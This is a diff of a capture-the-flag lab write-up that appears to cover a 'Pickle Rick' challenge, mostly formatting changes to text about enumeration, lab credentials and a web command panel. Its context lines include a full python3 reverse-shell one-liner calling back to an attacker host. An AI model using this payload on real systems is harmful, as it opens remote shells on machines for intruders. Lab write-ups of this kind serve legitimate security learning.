@@ -110,9 +110,9 @@ Progress: 14169 / 14172 (99.98%)
 Finished
 ===============================================================
 ```
-There are some interesting subdomains : /robots.txt, /login.php and portal.php .
+There are some interesting subdomains : **/robots.txt**, **/login.php** and **portal.php**.
 
-When we go on /robots.txt, we find another nice clue.
+When we go on **/robots.txt**, we find another nice clue.
 
 <details>
     <summary>Clue 2</summary>
@@ -123,21 +123,21 @@ Wubbalubbadubdub
 
 </details>
 
-/login.php and /portal.php send us both to /login.php.
+**/login.php** and **/portal.php** send us both to **/login.php**.
 
-![](images/login.jpg)
+![](images/login.png)
 
 
 
-Let's try to login with the credentials we had earlier.
-**User** : R1ckRul3s
-**Password** : Wubbalubbadubdub
+Let's try to login with the credentials we had earlier.<br>
+**User** : R1ckRul3s <br>
+**Password** : Wubbalubbadubdub <br>
 
 Bingo !
 
 
 #### Login.php
-![](images/command_panel.jpg)
+![](images/command_panel.png)
 
 If we try to navigate between the different sections, we see that only command is accessible for us. Let's try some commands then !
 
@@ -215,6 +215,8 @@ No response.
 After trying different commands, we find that python3 works : `export RHOST="IP_LOCAL_MACHINE";export RPORT=1234;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'` 
 
 And boom ! Reverse shell activated !
+
+### Privilege escalation
 
 Let's do some privilege escalation. What does `sudo -l` tells us ?
 ```bash
